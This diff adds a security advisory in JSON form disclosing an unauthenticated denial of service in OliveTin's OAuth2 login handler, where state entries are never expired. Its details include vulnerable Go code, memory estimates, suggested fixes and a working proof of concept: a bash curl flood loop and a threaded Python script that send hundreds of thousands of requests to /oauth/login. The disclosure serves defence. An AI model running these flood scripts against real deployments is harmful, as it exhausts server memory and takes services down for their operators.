@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-xpxj-f2fm-rqch",
+  "modified": "2026-07-30T14:30:39.100998036Z",
+  "published": "2026-07-30T14:24:53Z",
+  "aliases": [
+    "CVE-2026-67437"
+  ],
+  "summary": "OliveTin: Unauthenticated DoS via OAuth2 State Memory Exhaustion (Unbounded Map Growth)",
+  "details": "## Summary\n\nOliveTin's OAuth2 login handler stores per-login state in an in-memory map (`registeredStates`) that grows unboundedly. States are added on every `/oauth/login` request but are **never deleted or expired**. An unauthenticated attacker can send millions of requests to `/oauth/login` to fill the map with state entries, exhausting server memory and causing a denial of service.\n\nThis is **distinct from CVE-2026-28789** (concurrent map writes crash). That CVE was about the panic from unsynchronized map access — the fix added a `sync.RWMutex`. This vulnerability is about the **unbounded growth** of the map even WITH the mutex, as no cleanup mechanism exists.\n\n## Affected Versions\n\n- All versions with OAuth2 support, including \u003e= 3000.10.3 (which patched CVE-2026-28789)\n\n## Details\n\nIn `service/internal/auth/otoauth2/restapi_auth_oauth2.go`:\n\n```go\ntype OAuth2Handler struct {\n    cfg                 *config.Config\n    mu                  sync.RWMutex\n    registeredStates    map[string]*oauth2State  // NEVER cleaned up\n    registeredProviders map[string]*oauth2.Config\n}\n```\n\nThe `HandleOAuthLogin` handler adds a new state on every request:\n\n```go\nfunc (h *OAuth2Handler) HandleOAuthLogin(w http.ResponseWriter, r *http.Request) {\n    state, _ := randString(16)  // 24-byte base64 string\n    // ...\n    h.mu.Lock()\n    h.registeredStates[state] = \u0026oauth2State{\n        providerConfig: provider,\n        providerName:   providerName,\n        Username:       \"\",\n    }\n    h.mu.Unlock()\n    // ... redirect to OAuth2 provider\n}\n```\n\nThe `HandleOAuthCallback` handler updates existing states but never removes them:\n\n```go\nfunc (h *OAuth2Handler) HandleOAuthCallback(w http.ResponseWriter, r *http.Request) {\n    // ...\n    h.mu.Lock()\n    h.registeredStates[state].Username = userinfo.Username  // Updates, never deletes\n    h.registeredStates[state].Usergroup = ...\n    h.mu.Unlock()\n}\n```\n\nThere is **no TTL, no expiry check, no periodic cleanup, and no max size limit** on `registeredStates`.\n\n### Memory Impact Per State\n\nEach map entry consists of:\n- Key: ~24 bytes (base64 string)\n- Value: `*oauth2State` struct containing:\n  - `providerConfig *oauth2.Config` (pointer, 8 bytes + shared config)\n  - `providerName string` (~8-16 bytes)\n  - `Username string` (empty initially)\n  - `Usergroup string` (empty initially)\n- Go map overhead: ~100-150 bytes per entry\n\nEstimated: **~200 bytes per state entry**\n\nAt 1 million states ≈ **200 MB** of memory consumed.\nAt 10 million states ≈ **2 GB** of memory consumed.\n\n### Attack Vector\n\nThe `/oauth/login` endpoint is publicly accessible (unauthenticated). Each request is lightweight (no heavy computation like argon2). The server writes a cookie and returns a 302 redirect. An attacker can send thousands of requests per second.\n\n## PoC\n\n### Prerequisites\n\n- OliveTin instance with at least one OAuth2 provider configured\n- Network access to `/oauth/login`\n\n### Config\n\n```yaml\nlistenAddressSingleHTTPFrontend: 0.0.0.0:1337\nlogLevel: \"INFO\"\ncheckForUpdates: false\n\nauthOAuth2RedirectUrl: \"http://127.0.0.1:1337/oauth/callback\"\nauthOAuth2Providers:\n  github:\n    clientId: \"test-client-id\"\n    clientSecret: \"test-client-secret\"\n\nactions:\n  - title: noop\n    shell: echo \"ok\"\n```\n\n### Step 1: Baseline health check\n\n```bash\ncurl -i http://127.0.0.1:1337/readyz\n# Expected: 200 OK\n\ncurl -I \"http://127.0.0.1:1337/oauth/login?provider=github\"\n# Expected: 302 Found (redirect to GitHub)\n```\n\n### Step 2: Flood with state-creation requests\n\n```bash\n# Each request creates a new map entry that is never cleaned up\nfor i in $(seq 1 100000); do\n  curl -s -o /dev/null \"http://127.0.0.1:1337/oauth/login?provider=github\" \u0026\n  # Throttle to avoid connection limits\n  if (( i % 500 == 0 )); then\n    wait\n    echo \"Sent $i requests...\"\n  fi\ndone\nwait\necho \"Flood complete\"\n```\n\n### Step 3: Python PoC for sustained memory exhaustion\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: OAuth2 State Memory Exhaustion DoS\n\nDistinct from CVE-2026-28789 (concurrent map crash).\nThis exploits unbounded growth of the registeredStates map.\n\"\"\"\n\nimport requests\nimport time\nimport sys\nfrom concurrent.futures import ThreadPoolExecutor\n\nTARGET = \"http://127.0.0.1:1337\"\nPROVIDER = \"github\"\nWORKERS = 50\nTOTAL_REQUESTS = 500000\nBATCH_SIZE = 1000\n\ndef create_state(_):\n    \"\"\"Send /oauth/login to create a new state entry.\"\"\"\n    try:\n        requests.get(\n            f\"{TARGET}/oauth/login?provider={PROVIDER}\",\n            allow_redirects=False,\n            timeout=5\n        )\n        return True\n    except Exception:\n        return False\n\ndef check_health():\n    \"\"\"Check if the server is still responsive.\"\"\"\n    try:\n        r = requests.get(f\"{TARGET}/readyz\", timeout=5)\n        return r.status_code == 200\n    except Exception:\n        return False\n\nprint(f\"[*] Target: {TARGET}\")\nprint(f\"[*] Provider: {PROVIDER}\")\nprint(f\"[*] Total requests: {TOTAL_REQUESTS}\")\nprint(f\"[*] Workers: {WORKERS}\")\nprint()\n\nif not check_health():\n    print(\"[!] Server not reachable\")\n    sys.exit(1)\n\nstart_time = time.time()\ntotal_created = 0\n\nwith ThreadPoolExecutor(max_workers=WORKERS) as executor:\n    for batch_start in range(0, TOTAL_REQUESTS, BATCH_SIZE):\n        batch_end = min(batch_start + BATCH_SIZE, TOTAL_REQUESTS)\n        results = list(executor.map(create_state, range(batch_start, batch_end)))\n        total_created += sum(results)\n\n        elapsed = time.time() - start_time\n        rate = total_created / elapsed if elapsed \u003e 0 else 0\n        est_memory = total_created * 200 / 1024 / 1024  # MB\n\n        print(f\"  States created: {total_created:\u003e8} | \"\n              f\"Rate: {rate:\u003e6.0f}/s | \"\n              f\"Est. memory: {est_memory:\u003e6.1f} MB | \"\n              f\"Healthy: {check_health()}\")\n\n        if not check_health():\n            print(f\"\\n[!] Server became unresponsive after {total_created} states!\")\n            print(f\"[!] Estimated memory consumed: {est_memory:.1f} MB\")\n            break\n\nprint(f\"\\n[*] Attack complete. {total_created} states created in {time.time()-start_time:.1f}s\")\n```\n\n### Step 4: Verify memory growth (Docker)\n\n```bash\ndocker stats olivetin-instance --no-stream\n# Observe MEM USAGE growing continuously during the attack\n```\n\n## Impact\n\n- **Who is impacted:** All OliveTin deployments with any OAuth2 provider configured\n- **Attack requirements:** Unauthenticated network access to `/oauth/login`\n- **Effect:** Gradual memory exhaustion leading to OOM kill or service degradation\n- **Persistence:** Memory is never reclaimed (states are never deleted) even after the attack stops — a restart is required\n- **Distinction from CVE-2026-28789:** That CVE was a race condition crash (concurrent map writes). This is unbounded memory growth that persists even with the mutex fix applied.\n\n## Suggested Fix\n\n1. Add a TTL to OAuth2 states (e.g., 15 minutes matching the cookie `MaxAge`)\n2. Add a maximum state count (e.g., 10,000) with LRU eviction\n3. Clean up states after successful callback\n4. Add periodic garbage collection for expired states",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/OliveTin/OliveTin",
+        "purl": "pkg:golang/github.com/OliveTin/OliveTin"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.0.0-20251024001301-45f9c18bc3ee"
+            },
+            {
+              "fixed": "0.0.0-20260708075951-ec114e95d297"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-xpxj-f2fm-rqch/GHSA-xpxj-f2fm-rqch.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xpxj-f2fm-rqch"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67437"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/commit/ec114e95d297b806c3ca0c37bc139b3c9c517b3f"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/OliveTin/OliveTin"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0"
+    }
+  ]
+}
